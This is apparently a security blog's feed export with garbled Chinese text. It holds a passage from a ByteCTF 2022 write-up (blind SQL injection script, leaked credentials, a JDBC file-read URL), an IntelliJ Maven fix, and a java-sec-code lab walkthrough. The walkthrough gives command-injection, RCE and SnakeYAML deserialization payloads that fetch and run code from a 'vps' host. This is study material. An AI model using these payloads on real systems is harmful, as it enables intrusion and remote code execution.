string.printable[:-<span class="number">6</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">&quot;_%[]&quot;</span>:</span><br><span class="line">                i = <span class="string">&quot;\\\\&quot;</span>+i</span><br><span class="line">            payload = <span class="string">&quot;0x&quot;</span></span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> flag:</span><br><span class="line">                payload += <span class="string">&quot;%02x&quot;</span> % <span class="built_in">ord</span>(item)</span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> i:</span><br><span class="line">                payload += <span class="string">&quot;%02x&quot;</span> % <span class="built_in">ord</span>(item)</span><br><span class="line">            payload += <span class="string">&quot;25&quot;</span></span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            r = requests.get(url.replace(<span class="string">&quot;PAYLOAD&quot;</span>,payload),proxies=proxies,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="comment">#if &quot;SORRY!&quot; not in r.text:</span></span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                flag += i</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                success = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> success:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;failed&quot;</span>,flag)</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>SQLæ³¨å…¥å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç </p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf</span><br><span class="line">ctf@<span class="title class_">BvteDaNceS3</span>cRet</span><br></pre></td></tr></table></figure><p>statuså¤„å¯ä»¥æ‰§è¡Œä»»æ„sqlè¯­å¥</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926234457023.png" alt="image-20220926234457023"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> database();</span><br><span class="line"><span class="keyword">Result</span>: [[datamanager]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> version();</span><br><span class="line"><span class="keyword">Result</span>: [[<span class="number">8.0</span><span class="number">.30</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables;</span><br><span class="line"><span class="keyword">Result</span>: [[source,users,ADMINISTRABLE_ROLE_AUTHORIZATIONS,APPLICABLE_ROLES,CHARACTER_SETS,CHECK_CONSTRAINTS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMNS_EXTENSIONS,COLUMN_PRIVILEGES,COLUMN_STATISTICS,ENABLED_ROLES,ENGINES,EVENTS,FILES,INNODB_BUFFER_PAGE,INNODB_BUFFER_PAGE_LRU,INNODB_BUFFER_POOL_STATS,INNODB_CACHED_INDEXES,INNODB_CMP,INNODB_CMPMEM,INNODB_CMPMEM_RESET,INNODB_CMP_PER_INDEX,INNODB_CMP_PER_INDEX_RESET,INNODB_CMP_RESET,INNODB_COLUMNS,INNODB_DATAFILES,INNODB_FIELDS,INNODB_FOREIGN,INNODB_FOREIGN_COLS,INNODB_FT_BEING_DELETED,INNODB_FT_CONFIG,INNODB_FT_DEFAULT_STOPWORD,INNODB_FT_DELETED,INNODB_FT_INDEX_CACHE,INNODB_FT_INDEX_TABLE,INNODB_INDEXES,INNODB_METRICS,INNODB_SESSION_TEMP_TABLESPACES,INNODB_TABLES,INNODB_TABLESPACES,INNODB_TABLESPACES_BRIEF,INNODB_TABLESTATS,INNODB_TEMP_TABLE_INFO,INNODB_TRX,INNODB_VIRTUAL,KEYWORDS,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,RESOURCE_GROUPS,ROLE_COLUMN_GRANTS,ROLE_ROUTINE_GRANTS,ROLE_TABLE]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> source;</span><br><span class="line"><span class="keyword">Result</span>: [[<span class="number">1</span>, <span class="number">1</span>, public mysql server, <span class="operator">-</span>, <span class="number">3306</span>, mysql, <span class="keyword">Running</span>, root, mySql_Super_Str0ng_paSSw0rb], [<span class="number">2</span>, <span class="number">1</span>, internal cache server, <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span>, <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span>, redis, <span class="keyword">Running</span>, <span class="operator">-</span>, redis_means_Remote_D1ctionary_Server]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> variables;</span><br><span class="line">...[secure_file_priv, <span class="operator">/</span>tmp<span class="operator">/</span>]...</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926234948314.png" alt="image-20220926234948314"></p><p>connection testå¯ä»¥æ‰§è¡Œjdbc</p><p>ä½¿ç”¨ç”¨mysql fake serveræ¥è¯»æ–‡ä»¶ã€‚éœ€è¦ä¿®æ”¹ä¸€ä¸‹ mysqlproto&#x2F;protocol&#x2F;handshake.pyçš„72è¡Œ<code>d[2]</code>æ”¹æˆ<code>0x21</code> å¦åˆ™æŠ¥é”™</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220927003346984.png" alt="image-20220927003346984"></p><p>ä½†æ˜¯æ²¡æœ‰åƒWMæˆ˜é˜Ÿçš„ä½¿ç”¨netdocå¤ç°æˆåŠŸ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220927003601750.png" alt="image-20220927003601750"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=jdbc:mysql:<span class="comment">//ip:7007/jdbc?allowLoadLocalInfile=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true&amp;username=fileread_/very_Str4nge_NamE_of_flag&amp;password=5</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220927003137931.png" alt="image-20220927003137931"></p><p>å‚è€ƒé“¾æ¥ï¼š</p><ol><li><p><a href="https://blog.wm-team.cn/index.php/archives/28/">ByteCTF 2022 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p></li><li><p>EDISECæˆ˜é˜Ÿçš„wp:<a href="https://mp.weixin.qq.com/s/kLmQLCCbByQ15LgGWeHk3g">https://mp.weixin.qq.com/s/kLmQLCCbByQ15LgGWeHk3g</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> bytectf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ideaåˆ›å»ºmavené¡¹ç›®ä¸€ç›´æ˜¾ç¤ºloading archetype list...è§£å†³æ–¹æ³•</title>
      <link href="/2022/10/17/idea%E5%88%9B%E5%BB%BAmaven%E9%A1%B9%E7%9B%AE%E4%B8%80%E7%9B%B4%E6%98%BE%E7%A4%BAloading-archetype-list-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2022/10/17/idea%E5%88%9B%E5%BB%BAmaven%E9%A1%B9%E7%9B%AE%E4%B8%80%E7%9B%B4%E6%98%BE%E7%A4%BAloading-archetype-list-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ä½¿ç”¨ideaåˆ›å»ºmavené¡¹ç›®æ—¶ï¼Œæƒ³ä½¿ç”¨ç°æœ‰çš„æ¨¡æ¿<code>create from archetype</code>ï¼Œä½†æ˜¯ä¸€ç›´åŠ è½½ä¸å‡ºæ¥ï¼Œæ˜¾ç¤º<code>loading archetype list...</code></p><h2 id="è§£å†³æ–¹æ³•ï¼š"><a href="#è§£å†³æ–¹æ³•ï¼š" class="headerlink" title="è§£å†³æ–¹æ³•ï¼š"></a>è§£å†³æ–¹æ³•ï¼š</h2><p>å¯¹æ–°å»ºé¡¹ç›®çš„è®¾ç½®è¿›è¡Œä¿®æ”¹</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017151717260.png" alt="image-20221017151717260"></p><ol><li>ç¬¬ä¸€æ­¥</li></ol><p><code>setting--&gt;Build,Execution,Deployment--&gt;Build Tools--&gt;Maven--&gt;importing</code></p><p>ä¿®æ”¹å¯¹åº”çš„<code>JDK for importer</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017151536034.png" alt="image-20221017151536034"></p><ol start="2"><li>ç¬¬äºŒæ­¥</li></ol><p><code>setting--&gt;Build,Execution,Deployment--&gt;Build Tools--&gt;Maven--&gt;Runner</code></p><p>ä¿®æ”¹å¯¹åº”çš„jre</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017151638418.png" alt="image-20221017151638418"></p><p>æ³¨æ„ä¿®æ”¹ä¹‹åä¿å­˜ï¼ï¼ï¼</p><p>ç„¶åå†æ¬¡æ–°å»ºmavené¡¹ç›®çš„æ—¶å€™å°±ä¼šæ˜¾ç°å‡ºæ¥</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017151831776.png" alt="image-20221017151831776"></p><h2 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h2><p><a href="https://blog.csdn.net/pk694046220/article/details/80870313">(9æ¡æ¶ˆæ¯) Idea loading archetype listâ€¦_å½­ç‚ä¸ªäººç½‘çš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> æ‚è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> idea </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-sec-code-cmdinject-rce</title>
      <link href="/2022/10/12/java-sec-code-cmdinject-rce/"/>
      <url>/2022/10/12/java-sec-code-cmdinject-rce/</url>
      
        <content type="html"><![CDATA[<h1 id="java-sec-code"><a href="#java-sec-code" class="headerlink" title="java-sec-code"></a>java-sec-code</h1><p>[toc]</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>å¤§è‡´å‚è€ƒï¼š<a href="https://www.freebuf.com/articles/web/289863.html">ä»£ç å®¡è®¡å…¥é—¨ä¹‹java-sec-codeï¼ˆä¸€ï¼‰ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>ä¸åŒçš„åœ°æ–¹ï¼Œæˆ‘ä½¿ç”¨çš„idea2021éœ€è¦å°†srcè¿›è¡Œä¸€ä¸‹è®¾ç½®</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221006234746411.png" alt="image-20221006234746411"></p><p>ç„¶åæŒ‰ç…§4æ­¥è¿›è¡Œè®¾ç½®</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221006234842950.png" alt="image-20221006234842950"></p><p>å¯¼å…¥ä¾èµ–èŠ±äº†ä¸€äº›æ—¶é—´</p><p>å› ä¸ºæ˜¯åœ¨windowsä¸Šè¿è¡Œï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹ä¸€éƒ¨åˆ†ä»£ç </p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221006235105851.png" alt="image-20221006235105851"></p><p>ä¿®æ”¹index.html</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221006235704040.png" alt="image-20221006235704040"></p><p>è¿™ä¸ªé¶åœºåŒ…æ‹¬javaçš„å¾ˆå¤šæ¼æ´</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221007132307190.png" alt="image-20221007132307190"></p><p>è®¿é—®127.0.0.1:8080ï¼Œè´¦æˆ·å¯†ç  admin admin123</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221007132356964.png" alt="image-20221007132356964"></p><h2 id="CmdInject"><a href="#CmdInject" class="headerlink" title="CmdInject"></a>CmdInject</h2><p>å‘½ä»¤æ³¨å…¥</p><p>æ³¨æ„çœ‹url</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeinject?filepath=.%<span class="number">26</span>ipconfig</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221007132558252.png" alt="image-20221007132558252"></p><p>æŸ¥çœ‹æºç </p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221007161257904.png" alt="image-20221007161257904"></p><h3 id="å…³äºProcessBuilder"><a href="#å…³äºProcessBuilder" class="headerlink" title="å…³äºProcessBuilder"></a>å…³äºProcessBuilder</h3><p><a href="https://blog.csdn.net/u013256816/article/details/54603910">(7æ¡æ¶ˆæ¯) æµ…æProcessBuilder_æœ±å°å®çš„åšå®¢-CSDNåšå®¢_processbuilder</a></p><blockquote><p>ProcessBuilderç±»æ˜¯J2SE 1.5åœ¨java.langä¸­æ–°æ·»åŠ çš„ä¸€ä¸ªæ–°ç±»ï¼Œæ­¤ç±»ç”¨äºåˆ›å»ºæ“ä½œç³»ç»Ÿè¿›ç¨‹ï¼Œå®ƒæä¾›ä¸€ç§å¯åŠ¨å’Œç®¡ç†è¿›ç¨‹ï¼ˆä¹Ÿå°±æ˜¯åº”ç”¨ç¨‹åºï¼‰çš„æ–¹æ³•</p><p>å±æ€§command</p><p>â€‹æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå®ƒè¡¨ç¤ºè¦è°ƒç”¨çš„å¤–éƒ¨ç¨‹åºæ–‡ä»¶åŠå…¶å‚æ•°ï¼ˆå¦‚æœæœ‰ï¼‰ã€‚åœ¨æ­¤ï¼Œè¡¨ç¤ºæœ‰æ•ˆçš„æ“ä½œç³»ç»Ÿå‘½ä»¤çš„å­—ç¬¦ä¸²åˆ—è¡¨æ˜¯ä¾èµ–äºç³»ç»Ÿçš„ã€‚ä¾‹å¦‚ï¼Œæ¯ä¸€ä¸ªæ€»ä½“å˜é‡ï¼Œé€šå¸¸éƒ½è¦æˆä¸ºæ­¤åˆ—è¡¨ä¸­çš„å…ƒç´ ï¼Œä½†æœ‰ä¸€äº›æ“ä½œç³»ç»Ÿï¼Œå¸Œæœ›ç¨‹åºèƒ½è‡ªå·±æ ‡è®°å‘½ä»¤è¡Œå­—ç¬¦ä¸²â€”â€”åœ¨è¿™ç§ç³»ç»Ÿä¸­ï¼ŒJava å®ç°å¯èƒ½éœ€è¦å‘½ä»¤ç¡®åˆ‡åœ°åŒ…å«è¿™ä¸¤ä¸ªå…ƒç´ ã€‚(æ¯æ¬¡æ„é€ å‡½æ•°å°±æ˜¯å°†é‡Œé¢çš„åˆ—è¡¨èµ‹å€¼ç»™command)</p><p>å±æ€§redirectErrorStream</p><p>æœ€åˆï¼Œæ­¤å±æ€§ä¸º falseï¼Œæ„æ€æ˜¯å­è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡ºè¢«å‘é€ç»™ä¸¤ä¸ªç‹¬ç«‹çš„æµï¼Œè¿™äº›æµå¯ä»¥é€šè¿‡ Process.getInputStream() å’Œ Process.getErrorStream() æ–¹æ³•æ¥è®¿é—®ã€‚å¦‚æœå°†å€¼è®¾ç½®ä¸º trueï¼Œæ ‡å‡†é”™è¯¯å°†ä¸æ ‡å‡†è¾“å‡ºåˆå¹¶ã€‚è¿™ä½¿å¾—å…³è”é”™è¯¯æ¶ˆæ¯å’Œç›¸åº”çš„è¾“å‡ºå˜å¾—æ›´å®¹æ˜“ã€‚åœ¨æ­¤æƒ…å†µä¸‹ï¼Œåˆå¹¶çš„æ•°æ®å¯ä» Process.getInputStream() è¿”å›çš„æµè¯»å–ï¼Œè€Œä» Process.getErrorStream() è¿”å›çš„æµè¯»å–å°†ç›´æ¥åˆ°è¾¾æ–‡ä»¶å°¾ã€‚<br>ï¼ˆåœ¨codeinjectè¿™é‡Œï¼Œå°†å…¶è®¾ç½®ä¸ºtrueï¼Œå°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯åˆå¹¶ï¼‰</p></blockquote><p>ProcessBuilderç±»å’ŒProcessç±»</p><blockquote><p>æ—¢ç„¶æœ‰Processç±»ï¼Œé‚£ä¸ºä»€ä¹ˆè¿˜è¦å‘æ˜ä¸ªProcessBuilderç±»å‘¢ï¼ŸProcessBuilderå’ŒProcessä¸¤ä¸ªç±»æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ<br>åŸæ¥ï¼ŒProcessBuilderä¸ºè¿›ç¨‹æä¾›äº†æ›´å¤šçš„æ§åˆ¶ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥è®¾ç½®å½“å‰å·¥ä½œç›®å½•ï¼Œè¿˜å¯ä»¥æ”¹å˜ç¯å¢ƒå‚æ•°ã€‚è€ŒProcessçš„åŠŸèƒ½ç›¸å¯¹æ¥è¯´ç®€å•çš„å¤šã€‚<br>ProcessBuilderæ˜¯ä¸€ä¸ªfinalç±»ï¼Œæœ‰ä¸¤ä¸ªå¸¦å‚æ•°çš„æ„é€ æ–¹æ³•ï¼Œä½ å¯ä»¥é€šè¿‡æ„é€ æ–¹æ³•æ¥ç›´æ¥åˆ›å»ºProcessBuilderçš„å¯¹è±¡ã€‚è€ŒProcessæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä¸€èˆ¬éƒ½é€šè¿‡Runtime.exec()å’ŒProcessBuilder.start()æ¥é—´æ¥åˆ›å»ºå…¶å®ä¾‹ã€‚</p></blockquote><p>å¯åŠ¨ä¸€ä¸ªé»˜è®¤å·¥ä½œå·¥ä½œç›®å½•å’Œç¯å¢ƒçš„æ–°è¿›ç¨‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;myCommand&quot;</span>, <span class="string">&quot;myArg&quot;</span>).start();</span><br></pre></td></tr></table></figure><h3 id="codeinject-x2F-host"><a href="#codeinject-x2F-host" class="headerlink" title="codeinject&#x2F;host"></a>codeinject&#x2F;host</h3><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008082818494.png" alt="image-20221008082818494"></p><p>å¦‚æœå°†Hostç›´æ¥è®¾ç½®ä¸ºip:port</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008083009131.png" alt="image-20221008083009131"></p><p>é‚£ä¹ˆå°±ä¼šæ‰§è¡Œ<code>curl ip:port</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008082924674.png" alt="image-20221008082924674"></p><p>ä½†æ˜¯å¦‚æœæ˜¯ip:portï¼Œé‚£ä¹ˆå°±ä¸èƒ½è¿›è¡Œå‘½ä»¤æ³¨å…¥ï¼Œæ‰€ä»¥ä¸€å®šè¦å°†ç«¯å£å·æ¶ˆå»</p><h3 id="codeinject-x2F-sec"><a href="#codeinject-x2F-sec" class="headerlink" title="codeinject&#x2F;sec"></a>codeinject&#x2F;sec</h3><p>è¿™é‡Œå¯¹ä¼ å…¥çš„å‚æ•°filepathè¿›è¡Œäº†å¤„ç†</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008145226138.png" alt="image-20221008145226138"></p><p>è·Ÿè¿›SecurityUtil.cmdFilterå‡½æ•°</p><p>å¦‚æœåŒ¹é…åˆ°é™¤FILTER_PATTERNä»¥å¤–çš„å­—ç¬¦ï¼Œå°±è¿”å›null</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008145303967.png" alt="image-20221008145303967"></p><p>æŸ¥çœ‹<code>FILTER_PATTERN</code>ï¼Œæ˜¯å¤§å°å†™å­—æ¯å’Œæ•°å­—</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008145340125.png" alt="image-20221008145340125"></p><p>æ‰€ä»¥è¿™é‡Œå°±å°†ä¹‹å‰å‘½ä»¤æ‰§è¡Œçš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008145745292.png" alt="image-20221008145745292"></p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>ç®—æ˜¯äº†è§£å¤šç§javaè¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•</p><h3 id="runtime-x2F-rce"><a href="#runtime-x2F-rce" class="headerlink" title="runtime&#x2F;rce"></a>runtime&#x2F;rce</h3><p>ç›´æ¥æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ç»è¿‡è¿‡æ»¤</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150007111.png" alt="image-20221008150007111"></p><p>æ•ˆæœå¦‚ä¸‹</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150048967.png" alt="image-20221008150048967"></p><p>ä½†æ˜¯è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œç›´æ¥ä»ä¸»é¡µé¢ç‚¹å‡»RCEï¼Œä¸ä¼šåˆ°ä¸Šé¢çš„è·¯ç”±ä¸‹</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150120417.png" alt="image-20221008150120417"></p><p>è€Œæ˜¯ä¼šè·³åˆ°åˆ«çš„åœ°æ–¹<code>rce/exec?cmd=whoami</code>ï¼Œä¸æ˜¯æ­£ç¡®çš„è·¯ç”±</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150155045.png" alt="image-20221008150155045"></p><h3 id="processbuilder"><a href="#processbuilder" class="headerlink" title="processbuilder"></a>processbuilder</h3><p>æ³¨æ„ä¿®æ”¹ä»£ç </p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150459385.png" alt="image-20221008150459385"></p><p>è¿è¡Œæ•ˆæœ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150609672.png" alt="image-20221008150609672"></p><p>å…·ä½“ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String[] arrCmd = &#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(arrCmd);</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> processBuilder.start();</span><br></pre></td></tr></table></figure><h3 id="jscmd"><a href="#jscmd" class="headerlink" title="jscmd"></a>jscmd</h3><p>å°†zz.jsæ”¾ç½®åœ¨vpsä¸Š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="title function_">mainOutput</span>(); <span class="keyword">function</span> <span class="title function_">mainOutput</span>(<span class="params"></span>) &#123; <span class="keyword">var</span> x=java.<span class="property">lang</span>.<span class="property">Runtime</span>.<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&quot;calc&quot;</span>);&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008224655107.png" alt="image-20221008224655107"></p><p>ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line"><span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line">engine.eval(cmd, bindings);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/rce/jscmd?jsurl=http:<span class="comment">//vps/zz.js</span></span><br></pre></td></tr></table></figure><h3 id="vuln-x2F-yarm"><a href="#vuln-x2F-yarm" class="headerlink" title="vuln&#x2F;yarm"></a>vuln&#x2F;yarm</h3><p>å‚è€ƒï¼š<a href="https://www.freebuf.com/articles/web/338055.html">Javaä»£ç å®¡è®¡ä¹‹RCEæ¼æ´ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>åˆ©ç”¨SnakeYAMLå­˜åœ¨çš„ååºåˆ—åŒ–æ¼æ´æ¥rceï¼Œåœ¨è§£ææ¶æ„ymlå†…å®¹æ—¶ä¼šå®ŒæˆæŒ‡å®šçš„åŠ¨ä½œã€‚</p><p>æ”»å‡»çš„æµç¨‹ï¼š<code>å…ˆæ˜¯è§¦å‘java.net.URLå»æ‹‰å–è¿œç¨‹ HTTP æœåŠ¡å™¨ä¸Šçš„æ¶æ„ jar æ–‡ä»¶,ç„¶åæ˜¯å¯»æ‰¾ jar æ–‡ä»¶ä¸­å®ç°javax.script.ScriptEngineFactoryæ¥å£çš„ç±»å¹¶å®ä¾‹åŒ–ï¼Œå®ä¾‹åŒ–ç±»æ—¶æ‰§è¡Œæ¶æ„ä»£ç ï¼Œé€ æˆ RCE æ¼æ´</code></p><p><a href="https://github.com/artsploit/yaml-payload">artsploit&#x2F;yaml-payload: A tiny project for generating SnakeYAML deserialization payloads (github.com)</a></p><p>ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åjavacç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆyaml-payload.jar</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221011234824781.png" alt="image-20221011234824781"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://vps/yaml-payload.jar&quot;]]]]</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://vps/yaml-payload.jar%22]]]]</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221012174852653.png" alt="image-20221012174852653"></p><h3 id="sec-x2F-yarm"><a href="#sec-x2F-yarm" class="headerlink" title="sec&#x2F;yarm"></a>sec&#x2F;yarm</h3><p>ç›¸æ¯”äºä¸Šä¸€ä¸ªvuln&#x2F;yarmï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯SafeConstructorç±»</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221012175801301.png" alt="image-20221012175801301"></p><p>ä½¿ç”¨<code>new SafeConstructor()</code>å³å¯é˜²å¾¡Yamlååºåˆ—åŒ–</p><h3 id="groovy"><a href="#groovy" class="headerlink" title="groovy"></a>groovy</h3><p>ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">GroovyShell</span> <span class="variable">groovyShell</span> 